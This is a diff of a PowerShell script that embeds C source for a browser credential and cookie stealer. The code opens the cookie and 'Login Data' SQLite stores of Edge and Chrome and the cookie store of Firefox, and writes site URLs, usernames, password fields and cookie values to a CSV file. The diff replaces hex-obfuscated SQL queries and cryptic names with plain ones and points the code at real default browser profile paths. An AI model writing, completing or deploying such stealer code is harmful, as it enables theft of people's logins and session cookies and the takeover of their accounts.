@@ -24,6 +24,7 @@ $cCode = @'
 #include <sqlite3.h>
 #include <stdlib.h>
 #include <string.h>
+#include <windows.h>
 
 void decrypt(char *str) {
     while (*str) {
@@ -36,68 +37,85 @@ void write_to_csv(FILE *file, const char *type, const char *col1, const char *co
     fprintf(file, "%s,%s,%s,%s\n", type, col1, col2, col3);
 }
 
-void a(sqlite3 *b, FILE *file) {
-    sqlite3_stmt *c;
-    char d[] = {0x53, 0x45, 0x4c, 0x45, 0x43, 0x54, 0x20, 0x68, 0x6f, 0x73, 0x74, 0x5f, 0x6b, 0x65, 0x2c, 0x20, 0x6e, 0x61, 0x6d, 0x65, 0x2c, 0x20, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x20, 0x46, 0x52, 0x4f, 0x4d, 0x20, 0x63, 0x6f, 0x6f, 0x6b, 0x69, 0x65, 0x73, 0x00};
-    decrypt(d);
-    int e = sqlite3_prepare_v2(b, d, -1, &c, 0);
+void read_cookies(sqlite3 *db, FILE *file) {
+    sqlite3_stmt *res;
+    const char *sql = "SELECT host_key, name, value FROM cookies";
+    int rc = sqlite3_prepare_v2(db, sql, -1, &res, 0);
 
-    if (e != SQLITE_OK) {
-        fprintf(stderr, "Failed to fetch cookies: %s\n", sqlite3_errmsg(b));
+    if (rc != SQLITE_OK) {
+        fprintf(stderr, "Failed to fetch cookies: %s\n", sqlite3_errmsg(db));
         return;
     }
 
-    while (sqlite3_step(c) == SQLITE_ROW) {
+    while (sqlite3_step(res) == SQLITE_ROW) {
         write_to_csv(file, "Cookie",
-                     (const char *)sqlite3_column_text(c, 0),
-                     (const char *)sqlite3_column_text(c, 1),
-                     (const char *)sqlite3_column_text(c, 2));
+                     (const char *)sqlite3_column_text(res, 0),
+                     (const char *)sqlite3_column_text(res, 1),
+                     (const char *)sqlite3_column_text(res, 2));
     }
 
-    sqlite3_finalize(c);
+    sqlite3_finalize(res);
 }
 
-void f(sqlite3 *b, FILE *file) {
-    sqlite3_stmt *c;
-    char d[] = {0x53, 0x45, 0x4c, 0x45, 0x43, 0x54, 0x20, 0x6f, 0x72, 0x69, 0x67, 0x69, 0x6e, 0x5f, 0x75, 0x72, 0x6c, 0x2c, 0x20, 0x75, 0x73, 0x65, 0x72, 0x6e, 0x61, 0x6d, 0x65, 0x5f, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x2c, 0x20, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x5f, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x20, 0x46, 0x52, 0x4f, 0x4d, 0x20, 0x6c, 0x6f, 0x67, 0x69, 0x6e, 0x73, 0x00};
-    decrypt(d);
-    int e = sqlite3_prepare_v2(b, d, -1, &c, 0);
+void read_passwords(sqlite3 *db, FILE *file) {
+    sqlite3_stmt *res;
+    const char *sql = "SELECT origin_url, username_value, password_value FROM logins";
+    int rc = sqlite3_prepare_v2(db, sql, -1, &res, 0);
 
-    if (e != SQLITE_OK) {
-        fprintf(stderr, "Failed to fetch passwords: %s\n", sqlite3_errmsg(b));
+    if (rc != SQLITE_OK) {
+        fprintf(stderr, "Failed to fetch passwords: %s\n", sqlite3_errmsg(db));
         return;
     }
 
-    while (sqlite3_step(c) == SQLITE_ROW) {
+    while (sqlite3_step(res) == SQLITE_ROW) {
         write_to_csv(file, "Password",
-                     (const char *)sqlite3_column_text(c, 0),
-                     (const char *)sqlite3_column_text(c, 1),
-                     (const char *)sqlite3_column_text(c, 2));
+                     (const char *)sqlite3_column_text(res, 0),
+                     (const char *)sqlite3_column_text(res, 1),
+                     (const char *)sqlite3_column_text(res, 2));
     }
 
-    sqlite3_finalize(c);
+    sqlite3_finalize(res);
 }
 
-void g(const char *h, void (*i)(sqlite3 *, FILE *), FILE *file) {
-    sqlite3 *b;
-    int e = sqlite3_open(h, &b);
+void read_database(const char *db_path, void (*read_func)(sqlite3 *, FILE *), FILE *file) {
+    sqlite3 *db;
+    int rc = sqlite3_open(db_path, &db);
 
-    if (e != SQLITE_OK) {
-        fprintf(stderr, "Cannot open database %s: %s\n", h, sqlite3_errmsg(b));
+    if (rc != SQLITE_OK) {
+        fprintf(stderr, "Cannot open database %s: %s\n", db_path, sqlite3_errmsg(db));
         return;
     }
 
-    i(b, file);
-    sqlite3_close(b);
+    read_func(db, file);
+    sqlite3_close(db);
+}
+
+void get_firefox_profile_path(char *profile_path, size_t size) {
+    char appdata[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata))) {
+        snprintf(profile_path, size, "%s\\Mozilla\\Firefox\\Profiles", appdata);
+    }
 }
 
 int main() {
-    const char *j = "EdgeCookies.db";
-    const char *k = "EdgePasswords.db";
-    const char *l = "ChromeCookies.db";
-    const char *m = "ChromePasswords.db";
-    const char *n = "FirefoxCookies.sqlite";
-    const char *o = "FirefoxLogins.sqlite";
+    char edge_cookies[MAX_PATH];
+    char edge_passwords[MAX_PATH];
+    char chrome_cookies[MAX_PATH];
+    char chrome_passwords[MAX_PATH];
+    char firefox_profile[MAX_PATH];
+    char firefox_cookies[MAX_PATH];
+
+    // Get paths for Edge
+    snprintf(edge_cookies, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Cookies", getenv("LOCALAPPDATA"));
+    snprintf(edge_passwords, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Login Data", getenv("LOCALAPPDATA"));
+
+    // Get paths for Chrome
+    snprintf(chrome_cookies, MAX_PATH, "%s\\Google\\Chrome\\User Data\\Default\\Cookies", getenv("LOCALAPPDATA"));
+    snprintf(chrome_passwords, MAX_PATH, "%s\\Google\\Chrome\\User Data\\Default\\Login Data", getenv("LOCALAPPDATA"));
+
+    // Get path for Firefox profile
+    get_firefox_profile_path(firefox_profile, MAX_PATH);
+    snprintf(firefox_cookies, MAX_PATH, "%s\\<profile>\\cookies.sqlite", firefox_profile); // Replace <profile> with actual profile name
 
     FILE *file = fopen("output.csv", "w");
     if (!file) {
@@ -108,20 +126,20 @@ int main() {
     fprintf(file, "Type,Column1,Column2,Column3\n");
 
     printf("Reading Edge cookies and passwords...\n");
-    g(j, a, file);
-    g(k, f, file);
+    read_database(edge_cookies, read_cookies, file);
+    read_database(edge_passwords, read_passwords, file);
 
     printf("Reading Chrome cookies and passwords...\n");
-    g(l, a, file);
-    g(m, f, file);
+    read_database(chrome_cookies, read_cookies, file);
+    read_database(chrome_passwords, read_passwords, file);
 
-    printf("Reading Firefox cookies and passwords...\n");
-    g(n, a, file);
-    g(o, f, file);
+    printf("Reading Firefox cookies...\n");
+    read_database(firefox_cookies, read_cookies, file);
 
     fclose(file);
 
     return 0;
+}
 '@
 
 # Write the C code to a file
